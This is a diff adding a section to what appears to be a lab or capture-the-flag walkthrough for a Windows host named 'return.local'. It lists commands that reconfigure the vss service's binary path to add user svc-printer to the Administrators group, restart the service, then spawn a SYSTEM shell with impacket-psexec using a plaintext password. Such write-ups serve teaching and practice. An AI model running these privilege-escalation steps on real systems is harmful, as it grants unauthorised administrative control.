@@ -60,3 +60,34 @@ Microsoft Windows [Version 10.0.17763.4010]
 
 C:\Windows\system32>
 ```
+## Add Current User to Admin Group
+
+Add current session to Administrator Group.
+
+```
+sc.exe config vss binPath= "C:\WINDOWS\system32\cmd.exe /c net localgroup Administrators svc-printer /add"
+```
+
+Stop Service
+
+```
+sc.exe stop vss
+```
+
+Start Service
+
+```
+sc.exe start vss
+```
+
+Check if session is in Administrators Group
+
+```
+net localgroup administrators
+```
+
+We can now utilize psexec to spawn a SYSTEM Shell.
+
+```
+impacket-psexec svc-printer:'1edFg43012!!'@return.local
+```
